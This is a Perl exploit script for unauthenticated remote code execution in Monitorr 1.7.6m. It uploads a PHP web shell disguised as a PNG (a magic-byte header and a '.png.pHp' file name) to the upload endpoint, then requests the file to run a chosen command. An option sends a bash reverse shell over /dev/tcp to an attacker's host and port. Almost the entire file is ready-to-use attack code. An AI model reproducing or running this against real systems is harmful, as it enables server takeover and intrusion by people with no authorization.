#!/usr/bin/env perl

use strict;
use warnings;
use Getopt::Long;
use MIME::Base64;
use File::Basename;
use Mojo::UserAgent;

sub help {
    print <<HELP;
$0 - Exploit for Monitorr 1.7.6m - Remote Code Execution (Unauthenticated)

Usage: $0 [options]

Options:
    -h, --help          Show this help message and exit
    -u, --url           The url for the target Monitorr installation
    -s, --shell         Get a reverse shell
    -l, --lhost         Host that will receive the reverse shell
    -p, --lport         Port the reverse shell should connect
    -b, --cookie        Add a cookie if you need
    -c, --command       Command to execute (if not a reverse shell)

Exploit coded by LvMalware (https://github.com/LvMalware)

HELP
    exit 0
}

sub main {
    my ($url, $lhost, $lport, $file, $cookie, $cmd, $shell);
    GetOptions(
        'h|help'        => \&help,
        'u|url=s'       => \$url,
        's|shell'       => \$shell,
        'l|lhost=s'     => \$lhost,
        'p|lport=i'     => \$lport,
        'b|cookie=s'    => \$cookie,
        'c|command=s'   => \$cmd,
    );

    help unless $url;

    if ($shell) {
        unless ($lhost && $lport) {
            print "You must specify LHOST and LPORT\n";
            return 1;
        }
        $cmd  = "bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1'" if $shell;
    }

    unless ($cmd) {
        print "No command to execute\n";
        return 1;
    }

    my $name = join('', map { chr(65 + rand 26) } 1 .. 10) . '.png.pHp';
    my $data = qq[\x89\x50\x4e\x47\x0d\x0a\x1a\x0a<?php system("$cmd"); ?>];

    my $ua = Mojo::UserAgent->new->insecure(1);

    my $resp = $ua->post(
        "$url/assets/php/upload.php" => {
            "User-Agent"        => "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0",
            "Accept"            => "text/plain, */*; q=0.01",
            "Accept-Language"   => "en-US,en;q=0.5",
            "Accept-Encoding"   => "gzip, deflate",
            "X-Requested-With"  => "XMLHttpRequest",
            "Content-Type"      => "multipart/form-data; boundary=qYfgX",
            "Cookie"            => $cookie,
            "Origin"            => $url,
            "Connection"        => "close",
            "Referer"           => $url,
        } => <<DATA
--qYfgX
Content-Disposition: form-data; name="fileToUpload"; filename="$name"
Content-Type: image/png

$data

--qYfgX
DATA
    )->result;

    $name = lc $name;

    if ($resp->text =~ /has been uploaded to/) {
        print "File was uploaded. Accessing it now...\n";
    } else {
        print "File doesn't seen to have been uploaded. Trying to access it anyway...\n";
    }


    $resp = $ua->get(
        "$url/assets/data/usrimg/$name" => {
            "User-Agent"        => "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0",
            "Accept"            => "text/plain, */*; q=0.01",
            "Accept-Language"   => "en-US,en;q=0.5",
            "Accept-Encoding"   => "gzip, deflate",
            "X-Requested-With"  => "XMLHttpRequest",
            "Cookie"            => $cookie,
            "Origin"            => $url,
            "Connection"        => "close",
            "Referer"           => $url,
        }
    )->result;

    if ($resp->is_success) {
        print "Exploit succeeded :)\n";
    } else {
        print "Exploit failed :/\n";
    }

    0;
}

exit main unless caller
